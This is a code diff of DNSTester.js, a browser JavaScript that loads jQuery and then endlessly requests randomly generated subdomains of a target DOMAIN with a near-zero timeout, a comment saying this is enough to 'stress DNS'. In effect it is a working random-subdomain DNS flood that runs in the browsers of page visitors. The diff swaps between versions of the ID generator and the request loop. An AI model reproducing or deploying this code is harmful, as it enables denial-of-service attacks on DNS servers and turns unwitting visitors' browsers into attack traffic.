@@ -1,5 +1,5 @@
 /*!
- * DNSTester.js 0.0.3
+ * DNSTester.js 0.0.2
  * https://github.com/cnbeining/DNSTester.js
  * http://www.cnbeining.com/
  *
@@ -12,39 +12,27 @@
  *
  */
 document.write("<script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'>\x3c/script>");
-!window.jQuery && document.write("<script src='https://code.jquery.com/jquery-latest.js'>\x3c/script>"); //In casse HTTPS
-var COUNT = 0;
-var STARTTIME = (new Date).getTime();
-function makeid_old(length)
+!window.jQuery && document.write("<script src='//code.jquery.com/jquery-latest.js'>\x3c/script>"); //In casse HTTPS
+startime = (new Date).getTime();
+var count = 0;
+function unixtime() {
+    var a = new Date;
+    return Date.UTC(a.getFullYear(), a.getMonth(), a.getDay(), a.getHours(), a.getMinutes(), a.getSeconds()) / 1E3
+}
+function makeid(length)
 {
     var text = "";
     var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
     for( var i=0; i < length; i++ )
         text += possible.charAt(Math.floor(Math.random() * possible.length));
+        text = "https://" + text + DOMAIN //In case you put me in HTTPS sites
+
     return text;
 }
-function makeid_new(len) {
-    //Only avalable in new browsers
-    var arr = new Uint8Array((len || 40) / 2);
-    window.crypto.getRandomValues(arr);
-    text = [].map.call(arr, function(n) { return n.toString(16); }).join("");
-    return text;
-}
-makeid = makeid_new; //asserting
-try {
-    test_msg = makeid(5)
-}
-catch(err) {
-    console.log("New function not supported! " + err);
-    makeid = makeid_old;
-}
+NUM = 1;
 function r_send2() {
-    if ((MAX_COUNT < 1 || COUNT >= MAX_COUNT) != true) {
-          get("https://" + makeid(Math.floor((Math.random() * 64) + 1)) + DOMAIN) // NEVER FORGET, in case you use HTTPS
-      };
-      if (COUNT % 1000 == 0) { //report every 1000 times
-          console.log('Done: ' + COUNT.toString())
-      };
+    get(makeid(Math.floor((Math.random() * 64) + 1))) // NEVER FORGET
 }
 function get(a) {
     var b;
@@ -53,12 +41,13 @@ function get(a) {
         dataType: "script",
         timeout: 1E-4, //So fail immediately, but good enough to stress DNS
         cache: !0,
-        // beforeSend: function() {
-        // requestTime = (new Date).getTime()
-        // },
+        beforeSend: function() {
+        requestTime = (new Date).getTime()
+        },
         complete: function() {
-            COUNT += 1;
-            r_send2();
+        responseTime = (new Date).getTime();
+        b = Math.floor(responseTime - requestTime);
+        3E5 > responseTime - startime && (r_send(b), count += 1)
         }
         })
 }
